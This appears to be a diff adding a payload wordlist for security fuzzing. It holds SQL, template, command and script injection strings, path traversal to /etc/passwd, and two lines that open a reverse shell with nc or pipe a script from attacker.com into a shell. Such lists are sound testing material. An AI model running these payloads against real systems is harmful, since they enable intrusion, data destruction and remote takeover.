@@ -1,0 +1,28 @@
+' OR '1'='1
+" OR "1"="1
+1; DROP TABLE users--
+1 UNION SELECT null,null--
+{{constructor.constructor('return this')()}}
+${7*7}
+<script>alert(document.domain)</script>
+<b onmouseover=alert(1)>hover</b>
+javascript:alert(1)
+; ls -la
+| whoami
+`id`
+$(whoami)
+{{config}}
+{% import os %}{{os.popen('id').read()}}
+';exec('import os;os.system("id")');'
+../../../etc/passwd
+....//....//etc/passwd
+%0aSet-Cookie:malicious=1
+\u0000admin
+admin\u202e
+{{7*'7'}}
+#{7*7}
+${{7*7}}
+<%= system('id') %>
+|nc -e /bin/sh attacker.com 4444
+;curl attacker.com/shell.sh|sh
+{{''.__class__.__mro__[1].__subclasses__()}}
